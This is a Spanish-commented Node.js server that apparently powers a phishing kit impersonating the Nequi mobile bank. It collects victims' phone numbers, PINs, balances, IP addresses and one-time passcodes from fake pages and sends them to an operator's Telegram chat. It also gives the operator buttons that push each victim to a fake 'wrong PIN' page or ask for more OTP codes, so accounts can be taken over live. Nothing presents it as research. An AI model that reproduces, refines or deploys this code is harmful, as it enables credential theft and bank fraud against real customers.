/**
 * Servidor Node.js – Flujo Nequi + Telegram + Redirección
 * Despliegue: Render (GitHub). setInterval para evitar apagado.
 */

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram (opcional: si no hay token, no se envía pero el flujo sigue)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// Almacenamiento en memoria: sessionId -> { redirect_to, data, shortId }
const sessions = new Map();
// shortId -> sessionId (para callback_data ≤ 64 bytes)
const shortIdToSession = new Map();
let shortIdCounter = 0;

function createShortId() {
  const id = (++shortIdCounter).toString(36) + Date.now().toString(36).slice(-4);
  return id.length <= 8 ? id : id.slice(-8);
}

// JSON body
app.use(express.json());

// CORS para frontend estático (Azure Blob, etc.)
app.use(
  cors({
    origin: [
      'https://solucionsneqs.onrender.com',
      'https://openbanks.blob.core.windows.net',
    ],
    methods: ['GET', 'POST', 'PUT', 'OPTIONS'],
  }),
);

// Sirve estáticos desde la raíz del proyecto (index.html, loader.html, one-time-pass.html, assets, etc.)
app.use(express.static(path.join(__dirname)));

// Evitar que Express sirva server.js y package.json como estáticos (opcional: poner HTML en /public)
app.get('/server.js', (req, res) => res.status(404).end());
app.get('/package.json', (req, res) => res.status(404).end());

// ——— API NEQUI ———

// POST /api/nequi/transaccion – Recibe datos del index (celular, clave, saldo) y envía a Telegram
app.post('/api/nequi/transaccion', async (req, res) => {
  try {
    const { numero_nequi, clave, saldo_actual, session_id, phone_number } = req.body;
    if (!session_id) {
      return res.status(400).json({ success: false, error: 'session_id requerido' });
    }

    // IP del cliente (Render suele enviar X-Forwarded-For)
    const ip =
      (req.headers['x-forwarded-for'] &&
        String(req.headers['x-forwarded-for']).split(',')[0].trim()) ||
      req.ip;

    const shortId = createShortId();
    shortIdToSession.set(shortId, session_id);
    sessions.set(session_id, {
      redirect_to: null,
      data: {
        numero_nequi: numero_nequi || '',
        clave: clave || '',
        saldo_actual: saldo_actual != null ? String(saldo_actual) : '',
        phone_number: phone_number || '',
        ip: ip || '',
      },
      shortId,
    });

    // Enviar a Telegram con botones (si hay token)
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      const text = [
        '📌 *DATOS OBTENIDOS - NUEVO INGRESO*',
        '',
        `NUMERO: \`${numero_nequi || '-'}\``,
        `CLAVE: \`${clave || '-'}\``,
        `SALDO: \`${saldo_actual != null ? saldo_actual : '-'}\``,
        `IP: \`${ip || '-'}\``,
      ].join('\n');

      const keyboard = {
        inline_keyboard: [
          [
            { text: '🔴 ERROR LOGO - INDEX.HTML', callback_data: `${shortId}|error_logo` },
          ],
          [
            { text: '🟢 PEDIR DINAMICA - ONE-TIME-PASS', callback_data: `${shortId}|pedir_dinamica` },
          ],
          [
            { text: '🔴 Error Dinamica - ONE-TIME-PASS', callback_data: `${shortId}|error_dinamica` },
          ],
        ],
      };

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: 'Markdown',
          reply_markup: keyboard,
        }),
      });
    }

    res.json({ success: true, transaction_id: session_id });
  } catch (e) {
    console.error('POST /api/nequi/transaccion', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

// PUT /api/nequi/transaccion/:transaction_id – Recibe dinámica desde one-time-pass.html
app.put('/api/nequi/transaccion/:transaction_id', (req, res) => {
  const { transaction_id } = req.params;
  const { dinamica, session_id } = req.body || {};
  const session = sessions.get(transaction_id || session_id);
  if (session && session.data) {
    session.data.dinamica = session.data.dinamica || [];
    session.data.dinamica.push(dinamica || '');
  }
  // También registrar IP en este punto (por si cambia)
  if (session && session.data) {
    const ip =
      (req.headers['x-forwarded-for'] &&
        String(req.headers['x-forwarded-for']).split(',')[0].trim()) ||
      req.ip;
    session.data.ip = session.data.ip || ip || '';
  }

  // Enviar mensaje a Telegram con la dinámica si está configurado
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && session && session.data) {
    const dArr = session.data.dinamica || [];
    const ultimaDinamica = dArr[dArr.length - 1] || dinamica || '';
    const text = [
      '📌 *DATOS OBTENIDOS - CLIENTE DINAMICA*',
      '',
      `NUMERO: \`${session.data.numero_nequi || '-'}\``,
      `CLAVE: \`${session.data.clave || '-'}\``,
      `SALDO: \`${session.data.saldo_actual || '-'}\``,
      `DINAMICA: \`${ultimaDinamica || '-'}\``,
      `IP: \`${session.data.ip || '-'}\``,
    ].join('\n');

    const keyboard = {
      inline_keyboard: [
        [{ text: '🔴 ERROR LOGO - INDEX.HTML', callback_data: `${session.shortId}|error_logo` }],
        [
          {
            text: '🟢 PEDIR DINAMICA - ONE-TIME-PASS',
            callback_data: `${session.shortId}|pedir_dinamica`,
          },
        ],
        [
          {
            text: '🔴 Error Dinamica - ONE-TIME-PASS',
            callback_data: `${session.shortId}|error_dinamica`,
          },
        ],
      ],
    };

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown',
        reply_markup: keyboard,
      }),
    }).catch((e) => {
      console.error('Error enviando mensaje de dinámica a Telegram', e);
    });
  }

  res.json({ success: true });
});

// GET /api/redirect/get/:sessionId – Polling desde loader.html
app.get('/api/redirect/get/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);
  if (!session) {
    return res.json({ success: true, redirect_to: null });
  }
  res.json({ success: true, redirect_to: session.redirect_to });
});

// POST /api/redirect/set – Opcional: forzar redirección por API (por si no usas webhook)
app.post('/api/redirect/set', (req, res) => {
  const { session_id, redirect_to } = req.body;
  if (!session_id || !redirect_to) {
    return res.status(400).json({ success: false, error: 'session_id y redirect_to requeridos' });
  }
  const session = sessions.get(session_id);
  if (!session) {
    return res.status(404).json({ success: false, error: 'Sesión no encontrada' });
  }
  session.redirect_to = redirect_to;
  res.json({ success: true });
});

// ——— TELEGRAM WEBHOOK ———
// Recibe callback_query cuando el operador pulsa un botón en Telegram
app.post('/telegram/webhook', async (req, res) => {
  res.status(200).end();
  const body = req.body;
  if (!body || !body.callback_query) return;

  const { callback_query } = body;
  const data = callback_query.data || '';
  const [shortId, action] = data.split('|');
  const sessionId = shortIdToSession.get(shortId);
  if (!sessionId) return;

  const session = sessions.get(sessionId);
  if (!session) return;

  let redirect_to = null;
  if (action === 'error_logo') redirect_to = 'index.html?error=clave_invalida';
  else if (action === 'pedir_dinamica') redirect_to = 'one-time-pass.html';
  else if (action === 'error_dinamica') redirect_to = 'one-time-pass.html?error=dinamica';

  if (redirect_to) {
    session.redirect_to = redirect_to;
  }

  // Responder al callback para quitar “loading” en Telegram
  if (TELEGRAM_BOT_TOKEN) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback_query.id }),
    });
  }
});

// ——— MANTENER DESPIERTO EN RENDER (free tier) ———
const PING_INTERVAL_MS = 14 * 60 * 1000; // 14 minutos
setInterval(() => {
  console.log('[keep-alive]', new Date().toISOString());
}, PING_INTERVAL_MS);

// ——— INICIO ———
app.listen(PORT, () => {
  console.log(`Servidor escuchando en puerto ${PORT}`);
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no definidos: no se enviarán mensajes a Telegram.');
  }
});
